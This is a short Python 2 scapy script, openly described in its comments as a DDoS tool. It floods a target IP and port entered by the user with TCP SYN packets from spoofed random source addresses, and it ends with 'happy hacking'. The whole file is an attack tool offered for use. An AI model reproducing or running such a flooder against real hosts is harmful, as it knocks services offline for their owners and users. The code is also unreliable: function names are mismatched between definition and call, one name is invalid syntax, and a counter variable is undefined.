

# python based code to craft and overhead the tcp/ip network with fake tcp syn packets 
# purpose of the code is to ddos the target host as a ddos script/ driven by the user interaction .

from scapy.all import *

import os
import sys

import time 
import random

def randomIp():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN-flood(destIP,destPort,PACKET_counter):   # defining the syn attack function 
	
	total_packets = 0
	print "Sending tcp-syn packets...."
	
	
	for x in range (0,PACKET_counter): # sending 
		# defining the values of all of the required  headers of the TCP protocol before sending the packet 
		
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = destIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = destPort
		TCP_Packet.flags = "S"  # SYN FLAG packet defined here 
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)  # finally sending the crafted packet to the target host 
		
		total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total_packets)


def info():
	 
		
	os.system("clear") # clears the screen after the loading of the script 
	
	print "# TCP SYN Flooder Tool #"
	print "#############################"

	destIP = raw_input ("\nTarget IP : ")
	destPort = input ("Target Port : ")
	
	return destIP,int(destPort)
	

def main():
	dstIP,dstPort = info()
	PACKET_counter = input ("Number of tcp-syn packets yu want to send : ")
	
	SYN_Flood(dstIP,dstPort,int(PACKET_counter))

main()  # calling the main driver function 


# program ends 
# happy hacking :)/
